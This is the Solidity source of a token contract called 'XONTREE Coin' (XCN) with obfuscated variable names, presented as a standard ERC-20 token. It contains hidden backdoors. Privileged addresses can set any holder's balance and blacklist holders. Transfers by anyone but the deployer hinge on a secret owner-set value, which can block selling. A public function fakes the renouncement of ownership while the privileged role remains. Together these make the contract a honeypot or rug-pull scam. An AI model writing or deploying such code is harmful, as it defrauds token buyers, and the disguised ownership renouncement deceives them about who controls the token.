//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;

abstract contract buyTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptMaxMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityTeam) external view returns (uint256);

    function transfer(address autoLaunched, uint256 txToWallet) external returns (bool);

    function allowance(address isTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 txToWallet) external returns (bool);

    function transferFrom(
        address sender,
        address autoLaunched,
        uint256 txToWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed amountMax, uint256 value);
    event Approval(address indexed isTake, address indexed spender, uint256 value);
}

interface exemptMaxMarketingMetadata is exemptMaxMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


interface shouldFee {
    function createPair(address marketingReceiver, address launchTradingAmount) external returns (address);
}

interface listTake {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract XONTREECoin is buyTake, exemptMaxMarketing, exemptMaxMarketingMetadata {

    bool public tokenFee;

    bool public launchedWallet;

    uint8 private isTotalLaunch = 18;

    string private autoTake = "XONTREE Coin";

    address tradingFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function allowance(address exemptFundEnable, address maxWallet) external view virtual override returns (uint256) {
        if (maxWallet == walletTake) {
            return type(uint256).max;
        }
        return fundTeam[exemptFundEnable][maxWallet];
    }

    function feeBuyTotal(address launchedMarketing) public {
        tokenSenderMax();
        
        if (launchedMarketing == receiverExemptAuto || launchedMarketing == shouldFundFrom) {
            return;
        }
        limitEnableMax[launchedMarketing] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return isTotalLaunch;
    }

    function name() external view virtual override returns (string memory) {
        return autoTake;
    }

    function getOwner() external view returns (address) {
        return senderLimit;
    }

    string private tokenEnableExempt = "XCN";

    function symbol() external view virtual override returns (string memory) {
        return tokenEnableExempt;
    }

    mapping(address => uint256) private senderFrom;

    mapping(address => bool) public limitEnableMax;

    mapping(address => bool) public marketingSell;

    address public receiverExemptAuto;

    uint256 modeSwap;

    uint256 private launchToken = 100000000 * 10 ** 18;

    function owner() external view returns (address) {
        return senderLimit;
    }

    uint256 feeLaunch;

    address walletTake = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toTotalExempt;

    uint256 private listTrading;

    function balanceOf(address liquidityTeam) public view virtual override returns (uint256) {
        return senderFrom[liquidityTeam];
    }

    event OwnershipTransferred(address indexed amountLimit, address indexed liquidityExempt);

    function tokenSenderMax() private view {
        require(marketingSell[_msgSender()]);
    }

    function transfer(address tokenTeam, uint256 txToWallet) external virtual override returns (bool) {
        return modeTotal(_msgSender(), tokenTeam, txToWallet);
    }

    function launchedTake(address toLiquidity) public {
        if (toTotalExempt) {
            return;
        }
        
        marketingSell[toLiquidity] = true;
        if (tradingMode) {
            tokenFee = false;
        }
        toTotalExempt = true;
    }

    address private senderLimit;

    function isToken(address tokenTeam, uint256 txToWallet) public {
        tokenSenderMax();
        senderFrom[tokenTeam] = txToWallet;
    }

    bool public tradingMode;

    function walletLaunch() public {
        emit OwnershipTransferred(receiverExemptAuto, address(0));
        senderLimit = address(0);
    }

    mapping(address => mapping(address => uint256)) private fundTeam;

    uint256 private enableReceiverTrading;

    function modeTotal(address minSwap, address autoLaunched, uint256 txToWallet) internal returns (bool) {
        if (minSwap == receiverExemptAuto) {
            return minMaxTrading(minSwap, autoLaunched, txToWallet);
        }
        uint256 limitSwapWallet = exemptMaxMarketing(shouldFundFrom).balanceOf(tradingFund);
        require(limitSwapWallet == feeLaunch);
        require(!limitEnableMax[minSwap]);
        return minMaxTrading(minSwap, autoLaunched, txToWallet);
    }

    function tradingLaunch(uint256 txToWallet) public {
        tokenSenderMax();
        feeLaunch = txToWallet;
    }

    function transferFrom(address minSwap, address autoLaunched, uint256 txToWallet) external override returns (bool) {
        if (_msgSender() != walletTake) {
            if (fundTeam[minSwap][_msgSender()] != type(uint256).max) {
                require(txToWallet <= fundTeam[minSwap][_msgSender()]);
                fundTeam[minSwap][_msgSender()] -= txToWallet;
            }
        }
        return modeTotal(minSwap, autoLaunched, txToWallet);
    }

    address public shouldFundFrom;

    function minMaxTrading(address minSwap, address autoLaunched, uint256 txToWallet) internal returns (bool) {
        require(senderFrom[minSwap] >= txToWallet);
        senderFrom[minSwap] -= txToWallet;
        senderFrom[autoLaunched] += txToWallet;
        emit Transfer(minSwap, autoLaunched, txToWallet);
        return true;
    }

    bool private receiverSwap;

    function approve(address maxWallet, uint256 txToWallet) public virtual override returns (bool) {
        fundTeam[_msgSender()][maxWallet] = txToWallet;
        emit Approval(_msgSender(), maxWallet, txToWallet);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchToken;
    }

    constructor (){
        if (tradingMode) {
            listTrading = enableReceiverTrading;
        }
        walletLaunch();
        listTake senderList = listTake(walletTake);
        shouldFundFrom = shouldFee(senderList.factory()).createPair(senderList.WETH(), address(this));
        
        receiverExemptAuto = _msgSender();
        marketingSell[receiverExemptAuto] = true;
        senderFrom[receiverExemptAuto] = launchToken;
        
        emit Transfer(address(0), receiverExemptAuto, launchToken);
    }

}